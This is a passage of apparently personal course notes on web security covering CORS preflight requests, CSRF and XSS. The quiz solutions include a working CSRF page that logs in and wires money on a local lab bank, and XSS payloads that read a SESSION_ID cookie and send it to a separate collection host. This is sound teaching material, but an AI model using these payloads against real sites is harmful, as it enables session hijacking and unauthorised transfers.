```
GET /cources?status=enrolled
Host: api.udacity.com
Referer: yourcourselist.com
```
If the request `referer header` is on that list, it will be able to inspect the answer and use the data. \
Response:
```
HTTP/1.1 200 OK
Date: Mon.30 May 2016 00:23:24 GMT
Access-Control-Allow-Origin: yourcourselist.com
Connection: Keep-Alive
Content-Type: application/xml
```
Problem solved. Or not?

If you take a closer look you will realize that by the time the server sends back the headers the request will already have executed. \
_This can become problematic with destructive operations because it is already too late to ignore the request_. \
This is where __preflight requests__ come into play. \
A __preflight request__ uses the options method and allows the browser to signal that it only wants to check what is allowed and what is not. \
Request:
```
OPTIONS /
Referer: yourcourselist.com
```
A server should not execute any kind of business logic but only returned the headers similar to a head request. \
Response:
```
200 OK
Access-Control-Allow-Origin: yourcourselist.com
```
_However, not all requests will be preflighted, requests are made because of image text or forms will not be preflighted._ \
So any kind of get request will be sent straight away, you just won't be able to read the answer, if course doesn't allow it. \
The details about when preflight requests are actually sent with CORS are intricate and extensive, so I'll even link with details in instructor notes.
* [preflight requests and CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Preflighted_requests)

Now we have a couple of ways to get around the single origin restriction. If you're ever involved in publishing an API yourself, I'd encourage you to think about CORS from the very beginning and to enable it on your server.

#### 5.9 Security Exploit - CSRF
As we just learned, requests had looked just like they came from a forum will not be pre-flighted. \
You can't read the response if course doesn't allow it. But sometimes you might not need to see the response to wreak havoc. \
Imagine a bank that has a forum to transfer money. If you are not a good person,
all you want to do is wire the money to your own account, you don't care about what the server answers. \
So you set up a website that forges a request of the same URL the forum uses and set the parameters so that the money is wired to you and the user won't even notice. \
That's why this kind of attack is called __cross-sites request forgery__ or __CSRF__.
Of course, banks have sophisticated protection mechanisms but for most purposes,
a CSRF token is protection enough. \
If CSRF token is additional field appended to a form that has been put there by a server and it starts server side as well. If someone is submitting a request, the seller checks that token against the one that has stored and only execute the requests if these tokens match.

#### 5.11 CSRF Quiz
Solution:
```js
<head>
</head>
<body>
  <button>Donate to Umbrella Corp.</button>
  <script>
    var button = document.querySelector('button');

    button.addEventListener('click', function() {
      csrf();
      console.log('Thank you for donation!');
    });

    function csrf(){
      fetch('http://bank.127.0.0.1.xip.io:8080/login', {
	      mode:'no-cors',
        method:'POST',
	      credentials:'include',
        headers: {
          'Host' : 'bank.127.0.0.1.xip.io:8080',
		      'Connection' : 'Keep-Alive',
          'Content-Length': '30',
		      'Cache-Control' : 'max-age=0',
          'Origin' : 'http://bank.127.0.0.1.xip.io:8080',
          'Upgrade-Insecure-Requests' : '1',
          'Content-Type' : 'application/x-www-form-urlencoded',
          'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3397.0 Safari/537.36',
   		    'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
          'Referer' : 'http://bank.127.0.0.1.xip.io:8080/login',
		      'Accept-Encoding' : 'gzip, deflate',
		      'Accept-Language' : 'en-US,en;q=0.9',
          'Cookie' : 'SESSION_ID='
        },
	      body: 'password=super+secret+password'
      }).then(function(response) {
	      console.log(response);
	      fetch('http://bank.127.0.0.1.xip.io:8080/transfer', {
          mode:'no-cors',
          method:'POST',
          credentials:'include',
          headers: {
            'Host' : 'bank.127.0.0.1.xip.io:8080',
            'Connection' : 'Keep-Alive',
            'Content-Length': '34',
            'Cache-Control' : 'max-age=0',
            'Origin' : 'http://bank.127.0.0.1.xip.io:8080',
            'Upgrade-Insecure-Requests' : '1',
            'Content-Type' : 'application/x-www-form-urlencoded',
            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3397.0 Safari/537.36',
            'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Referer' : 'http://bank.127.0.0.1.xip.io:8080/login',
            'Accept-Encoding' : 'gzip, deflate',
            'Accept-Language' : 'en-US,en;q=0.9',
            'Cookie' : 'SESSION_ID='
          },
          body: 'recipient=Umbrella+Corp&amount=666'
	      }).then(function(response) {
    	    console.log(response);
	      });
      });
    }
  </script>
</body>
```

#### 5.11 Security Exploit - XSS
Whenever a website shows user input, you need to be careful and vigilant. The users input can be anything and it is your responsibility to make sure it won't break your site. \
A clueless user might break it by accident. An evil attacker might exploit this flaw and make your website do things that it did not intend at all. \
Not validating user input is one of the oldest vulnerabilities on the web and it's called __cross-site scripting__ or __XSS__ for short. \
The name comes from the fact that JavaScript can be inject into another site but gets executed and has access to all of that site's data. \
A typical example is a website that asks for a users name when they want to leave a comment. If this input is not validated, a user's name can be crafted in such a way that it contains JavaScript code. \
That means that every user reading that comment will only see the name but the code will be executed without the users knowledge. \
In the grand scheme of things, this example here is a rather harmless but the script has access to all of the site's data including the DOM and Cookies. It could even make fetch requests from the site's origin. A well crafted XSS exploit can be detrimental.\
The only way you can secure yourself against these kinds of attacks is to follow a golden rule that always applies in software engineering. \
__Validate your user's inputs server-side__.

* [XSS (Cross-site Scripting) on Wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)

#### 5.12 XSS Quiz
Setting data form to body:
```js
let sessionId = document.cookie.match(/SESSION_ID=[^;]+/)[0].split('=')[1];
// let sessionId = document.cookie.match(/SESSION_ID=[^;]+/)[0].slice('SESSION_ID='.length);
fetch('http://decoder.127.0.0.1.xip.io:8080', {
  method:'POST',
  headers: {
    'Content-Type' : 'application/x-www-form-urlencoded',
  },
  body: 'key='+sessionId,
}).then(function(response) {
    console.log(response);
}).catch(function(exception) {
  console.log(exception);
});
```
Encoding data form in url:
```js
let sessionId = document.cookie.match(/SESSION_ID=[^;]+/)[0].split('=')[1];
// let sessionId = document.cookie.match(/SESSION_ID=[^;]+/)[0].slice('SESSION_ID='.length);
fetch('http://decoder.127.0.0.1.xip.io:8080?'+'key='+sessionId, {
  method:'POST',
  headers: {
    'Content-Type' : 'application/x-www-form-urlencoded',
  }
}).then(function(response) {
    console.log(response);
}).catch(function(exception) {
  console.log(exception);
});
```
Encoding the script into a name string
```js
yourname<script>
fetch('http://decoder.127.0.0.1.xip.io:8080?'+'key='+document.cookie.match(/SESSION_ID=[^;]+/)[0].split('=')[1], { method:'POST',
  headers: {
    'Content-Type' : 'application/x-www-form-urlencoded',
  }
})</script>

```
